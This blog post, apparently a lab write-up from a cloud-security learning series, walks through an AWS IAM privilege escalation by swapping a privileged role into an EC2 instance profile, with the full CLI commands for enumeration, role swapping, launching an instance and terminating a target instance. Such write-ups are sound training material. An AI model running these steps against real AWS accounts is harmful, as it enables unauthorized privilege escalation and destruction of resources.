---
title: '100 Days of Cloud Security - Day 44: Attack — iam_privesc_by_attachment'
date: '2025-12-23'
author: 'Venkata Pathuri'
excerpt: 'Day 44 of my cloud security journey - Attack — iam_privesc_by_attachment'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 44: Attack — iam_privesc_by_attachment

## Overview
Welcome to Day 44 of our 100-day cloud security journey! Today, we delve into a critical attack vector known as IAM privilege escalation via attachment, where we exploit misconfigured IAM roles and instance profiles to gain unauthorized access. This lesson builds on our previous discussions about IAM roles and instance profiles, emphasizing the importance of rigorous permission audits and security hygiene in cloud environments.

## Learning Objectives
By the end of today’s session, you will understand how to identify and exploit weak IAM configurations in AWS to escalate privileges and perform unauthorized actions such as terminating critical instances. You’ll gain hands-on experience in recognizing the risks associated with improper role assignments and learn how to safeguard your infrastructure against such attacks.

## Deep Dive
Privilege escalation attacks in cloud environments frequently stem from misconfigured IAM roles and permissions. In AWS, IAM roles are a key part of how resources can interact securely. When an EC2 instance is launched with an instance profile that grants it permissions, any vulnerabilities in that configuration can lead to significant security breaches.

### Key Concepts

1. **IAM Roles and Instance Profiles**: IAM roles allow AWS services to perform actions on behalf of users. Each EC2 instance can be associated with an instance profile that contains one or more IAM roles. If these roles are overly permissive, malicious actors can manipulate them to gain access to sensitive resources.

2. **Reconnaissance**: Before launching an attack, reconnaissance is essential. Using tools like `awsenum.py`, we can enumerate permissions and discover available IAM roles and their associated instance profiles. This step is crucial in understanding what resources an attacker can access.

3. **Privilege Escalation Steps**:
   - Identify IAM roles and instance profiles associated with your EC2 instances.
   - Remove the existing role and attach a more privileged role.
   - Launch a new EC2 instance with the modified instance profile, which now has elevated permissions.

### Example Walkthrough
Here’s how the process unfolds in our scenario:

1. **Reconnaissance**:
   Start by running the following command to gather IAM permissions:

   ```bash
   ./awsenum.py --profile cg --region us-east-1
   ```

   This yields a list of permissions, highlighting areas of potential weakness.

2. **Identifying IAM Roles**:
   Check for existing roles:

   ```bash
   aws iam list-roles --profile cg
   ```

   Here, we find roles like `cg-ec2-meek-role-cgidah4yg6lx8y` and `cg-ec2-mighty-role-cgidah4yg6lx8y`, which can be assumed by EC2 instances.

3. **Modifying Instance Profiles**:
   To escalate privileges, remove the less privileged role and attach a more powerful one:

   ```bash
   aws iam remove-role-from-instance-profile \
     --instance-profile-name cg-ec2-meek-instance-profile-cgidah4yg6lx8y \
     --role-name cg-ec2-meek-role-cgidah4yg6lx8y \
     --profile cg

   aws iam add-role-to-instance-profile \
     --instance-profile-name cg-ec2-meek-instance-profile-cgidah4yg6lx8y \
     --role-name cg-ec2-mighty-role-cgidah4yg6lx8y \
     --profile cg
   ```

4. **Launching a New Instance**:
   With the elevated role attached, launch a new EC2 instance:

   ```bash
   aws ec2 run-instances \
     --image-id ami-0a313d6098716f372 \
     --instance-type t2.micro \
     --iam-instance-profile Arn=arn:aws:iam::997581282912:instance-profile/cg-ec2-meek-instance-profile-cgidah4yg6lx8y \
     --key-name pwned \
     --profile cg \
     --subnet-id subnet-0a91524e1d8748ec0 \
     --security-group-ids sg-0c96cb29e40bdc6a1
   ```

5. **Access and Terminate the Target Instance**:
   Finally, access the newly created instance and terminate the original EC2 instance using:

   ```bash
   aws ec2 terminate-instances \
     --instance-ids i-04d5781389fc147fa \
     --region us-east-1
   ```

This series of actions demonstrates how attackers can leverage IAM misconfigurations to perform destructive actions like instance termination.

## Hands-On Practice
To replicate this scenario safely in your environment:

1. Use the AWS CLI to enumerate IAM roles and permissions.
2. Modify instance profiles as demonstrated above, ensuring to replace commands with your actual environment settings.
3. Verify whether the permissions have escalated by attempting to perform actions on EC2 instances.

### Common Troubleshooting Tips
- Ensure that the IAM user has sufficient permissions to modify instance profiles.
- Double-check role names and instance profile names for typos.
- Monitor AWS CloudTrail logs for unauthorized access attempts.

## Key Takeaways
Understanding IAM privilege escalation through attachment is crucial for maintaining a secure AWS environment. Today, we learned how to identify and exploit misconfigured roles, which can lead to unauthorized access and manipulation of resources. Always ensure least privilege principles are followed, and regularly audit IAM configurations to prevent such vulnerabilities.

## Real-World Applications
In production environments, maintaining strict controls over IAM roles and instance profiles is essential. Organizations should conduct regular security audits and implement monitoring solutions to detect unauthorized changes. As we've seen, privilege escalation can lead to severe consequences, including data loss and service disruption, making this knowledge critical for cloud security professionals.

---
**Journey Progress:** 44/100 Days Complete 🚀